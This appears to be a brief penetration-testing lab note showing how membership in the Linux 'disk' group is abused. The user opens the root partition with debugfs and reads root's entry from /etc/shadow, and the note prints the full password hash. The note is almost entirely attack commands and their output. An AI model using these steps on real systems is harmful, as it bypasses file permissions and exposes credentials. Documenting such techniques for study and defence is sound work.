# Group Disk

## Checking Group Membership

```sh
secaudit@NIX02:~$ id
```

```output title="Output"
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),995(disk)
```

## Finding Root Partition

```sh
secaudit@NIX02:~$ df -h
```

```output title="Output" hl_lines="4"
Filesystem      Size  Used Avail Use% Mounted on
udev            1.5G     0  1.5G   0% /dev
tmpfs           301M  740K  300M   1% /run
/dev/sda1       8.8G  4.5G  4.2G  52% /
tmpfs           1.5G     0  1.5G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           1.5G     0  1.5G   0% /sys/fs/cgroup
tmpfs           301M     0  301M   0% /run/user/1010
```

## Starting Debugger

```sh
secaudit@NIX02:~$ debugfs /dev/sda1
```

## Abusing

```sh
debugfs:  grep root /etc/shadow
```

```linuxconfig title="Output"
root:$6$WanLJSRD$y.zGt2OxMWkO9K/aNaLzh48ugtuVFjMJp9AT8Q3CxEJNjGaGTarLU5Vs1aZIOGv.jyehUWE5Ue.rz/kYnxDQ2.:19744:0:99999:7:::
```
